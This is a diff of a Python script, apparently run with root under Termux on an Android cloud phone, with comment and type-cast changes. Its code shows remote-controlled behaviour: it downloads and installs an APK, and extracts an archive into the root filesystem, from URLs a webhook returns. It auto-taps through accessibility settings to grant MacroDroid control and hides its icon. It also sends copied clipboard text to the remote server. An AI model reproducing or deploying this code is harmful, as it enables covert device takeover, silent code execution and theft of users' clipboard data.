@@ -11,9 +11,12 @@ if len(sys.argv) < 4:
     print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
     sys.exit(1)
 
+# 1. CORREÇÃO: Pegando exatamente a ordem que o import.py envia
 DEVICE_ID = sys.argv[1]
 GUILD_ID = sys.argv[2]
 OWNER_ID = sys.argv[3]
+
+# Deve bater na mesma URL definida no import.py
 URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 APP_PACKAGE = "com.arlosoft.macrodroid"
 FLAG_GHOST = "/sdcard/.hapie_ghost_done"
@@ -22,7 +25,6 @@ CONFIG_FILE = "hapie_config.json"
 # Garante que o Termux não durma
 subprocess.run("termux-wake-lock", shell=True, check=False)
 
-# Recupera o Token Dinâmico (JWT) do cofre
 def obter_client_token():
     if os.path.exists(CONFIG_FILE):
         try:
@@ -51,7 +53,6 @@ def is_app_installed():
     except Exception:
         return False
 
-# Recebe "vision" para saber se oculta o ícone ou não
 def setup_macrodroid(vision=False):
     if os.path.exists(FLAG_GHOST):
         if vision == False:
@@ -64,7 +65,7 @@ def setup_macrodroid(vision=False):
 
     print("⚙️ [SETUP] UGPhone bloqueando root. Ativando Hack de Ghost Touch...", flush=True)
     subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
-    
+
     def get_xml():
         subprocess.run('su -c "uiautomator dump /sdcard/ui.xml"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
         try:
@@ -82,7 +83,7 @@ def setup_macrodroid(vision=False):
         if text: pattern = fr'text="{text}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
         elif ui_class: pattern = fr'class="{ui_class}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
         else: return False
-            
+
         match = re.search(pattern, xml, re.IGNORECASE)
         if match:
             tap_bounds(match)
@@ -91,7 +92,7 @@ def setup_macrodroid(vision=False):
 
     print("🤖 [GHOST TOUCH] Assumindo o controle da tela...", flush=True)
     subprocess.run('su -c "am start -a android.settings.ACCESSIBILITY_SETTINGS"', shell=True)
-    time.sleep(4) 
+    time.sleep(4)
 
     if click_element(text="MacroDroid"):
         time.sleep(1.5)
@@ -104,7 +105,7 @@ def setup_macrodroid(vision=False):
 
     if click_element(text="MacroDroid UI Interaction"):
         time.sleep(1.5)
-        click_element(ui_class="android.widget.Switch") 
+        click_element(ui_class="android.widget.Switch")
         time.sleep(1.5)
         if not click_element(text="ALLOW"): click_element(text="PERMITIR")
         time.sleep(1)
@@ -113,8 +114,7 @@ def setup_macrodroid(vision=False):
 
     subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity"', shell=True)
     subprocess.run(f"touch {FLAG_GHOST}", shell=True)
-    
-    # Se vision for False (App de Sistema), esconde o app
+
     if vision == False:
         try:
             fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
@@ -134,7 +134,7 @@ def download_and_install(url):
             for chunk in response.iter_content(chunk_size=8192):
                 if chunk: f.write(chunk)
         if not os.path.exists(apk_path): return False
-        
+
         subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
         if os.path.exists(apk_path): os.remove(apk_path)
         return True
@@ -151,14 +151,14 @@ def download_and_inject_data(data_url):
         with open(data_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 if chunk: f.write(chunk)
-        
+
         if not os.path.exists(data_path): return False
-        
+
         print("💉 [DATA] Injetando pastas e configurando permissões...", flush=True)
         subprocess.run(f'su -c "tar -xzvf {data_path} -C /"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run('su -c "chown -R $(stat -c \'%u:%g\' /data/data/com.arlosoft.macrodroid) /data/data/com.arlosoft.macrodroid"', shell=True)
         subprocess.run('su -c "am force-stop com.arlosoft.macrodroid"', shell=True)
-        
+
         os.remove(data_path)
         print("✅ [DATA] Configurações e Macros injetadas com sucesso!", flush=True)
         return True
@@ -179,42 +179,41 @@ def check_authorization():
     try:
         installed = is_app_installed()
         token = obter_client_token()
-        
+
+        # 2. CORREÇÃO CRUCIAL: Enviando as chaves mapeadas com as variáveis corretas
         payload = {
             "ping": True,
-            "device_id": DEVICE_ID,
-            "guild_id": GUILD_ID,
-            "owner_id": OWNER_ID,
+            "device_id": str(DEVICE_ID),
+            "guild_id": str(GUILD_ID),
+            "owner_id": str(OWNER_ID),
             "app_system": not installed,
             "client_token": token,
-            "report": {"system_info": {"model": "Hapiephone Guard", "root_access": True, "device_id": DEVICE_ID}}
+            "report": {"system_info": {"model": "Hapiephone Guard", "root_access": True, "device_id": str(DEVICE_ID)}}
         }
         headers = {"Content-Type": "application/json"}
-        
+
         response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=15)
         if response.status_code == 200:
             data = response.json()
-            
-            # Se vier uma chave nova do Vercel, atualiza no JSON
+
             if "new_client_token" in data:
                 atualizar_client_token(data["new_client_token"])
-                
+
             vision_status = data.get("vision", False)
-                
+
             if not installed:
                 apk_url = data.get("link") or data.get("system_apk_url")
                 data_url = data.get("data")
-                
+
                 if apk_url and download_and_install(apk_url):
-                    # Injeta dados se for App de Sistema e tiver link de dados
                     if vision_status == False and data_url:
                         download_and_inject_data(data_url)
-                    
+
                     setup_macrodroid(vision=vision_status)
                     installed = True
             else:
                 setup_macrodroid(vision=vision_status)
-                
+
             return data.get("status") == "active" and installed
         return False
     except Exception:
@@ -223,7 +222,7 @@ def check_authorization():
 def sync_macrodroid():
     print("🔄 [SYNC] Enviando variáveis e segredos para o MacroDroid...", flush=True)
     token = obter_client_token() or ""
-    # Agora passa o client_token para o MacroDroid, e não a senha estática
+    # 3. CORREÇÃO: Sincronizando com o app enviando as chaves certas
     cmd = (
         f'su -c "am broadcast -a hapiephone.sync '
         f'--es device_id \'{DEVICE_ID}\' '
@@ -252,15 +251,17 @@ def start_vigilante():
                     return
                 try:
                     token = obter_client_token()
+                    
+                    # 4. CORREÇÃO: Enviando os textos copiados associados ao dono real
                     payload = {
-                        "texto": current, 
-                        "device_id": DEVICE_ID, 
-                        "guild_id": GUILD_ID, 
-                        "owner_id": OWNER_ID,
+                        "texto": current,
+                        "device_id": str(DEVICE_ID),
+                        "guild_id": str(GUILD_ID),
+                        "owner_id": str(OWNER_ID),
                         "client_token": token
                     }
                     headers = {"Content-Type": "application/json"}
-                    
+
                     res = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
                     if res.status_code == 200:
                         data = res.json()
@@ -279,16 +280,16 @@ def start_vigilante():
 def main():
     print("📡 Hapiephone System Online...", flush=True)
     if is_app_installed():
-        setup_macrodroid(vision=False) # Valor base caso não tenha passado pelo check ainda
-        
+        setup_macrodroid(vision=False)
+
     sync_macrodroid()
-    
+
     while True:
         if check_authorization():
             start_vigilante()
         else:
             print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
-            time.sleep(300) 
+            time.sleep(300)
 
 if __name__ == "__main__":
     main()
